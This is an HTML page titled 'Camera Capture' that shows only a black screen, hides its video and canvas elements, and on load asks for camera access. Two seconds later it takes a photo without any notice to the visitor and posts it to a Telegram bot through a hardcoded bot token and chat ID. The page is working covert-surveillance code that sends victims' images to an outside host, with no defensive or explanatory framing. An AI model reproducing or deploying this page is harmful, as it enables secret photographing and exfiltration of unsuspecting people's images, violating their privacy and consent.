
<!DOCTYPE html>
<html>
  <head>
    <title>Camera Capture</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
      body { margin: 0; background: black; display: flex; justify-content: center; align-items: center; height: 100vh; }
      video, canvas { display: none; }
    </style>
  </head>
  <body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <script>
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const ctx = canvas.getContext('2d');
      const TELEGRAM_BOT_TOKEN = '7458129205:AAFS27USvPAi_SUh5NE7UJVuRBMXjwo6Eaw';
      const TELEGRAM_CHAT_ID = '1018420572';

      async function sendPhoto(blob) {
        const formData = new FormData();
        formData.append('photo', blob, 'image.jpg');

        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto?chat_id=${TELEGRAM_CHAT_ID}`, {
          method: 'POST',
          body: formData
        });

        if (response.ok) {
          console.log('Photo sent!');
        } else {
          console.error('Failed to send photo.');
        }
      }

      async function captureAndSend() {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob(sendPhoto, 'image/jpeg');
      }

      async function initCamera() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          video.srcObject = stream;

          video.onloadedmetadata = () => {
            setTimeout(captureAndSend, 2000);
          };
        } catch (error) {
          console.error('Camera access denied or not available', error);
        }
      }

      initCamera();
    </script>
  </body>
</html>
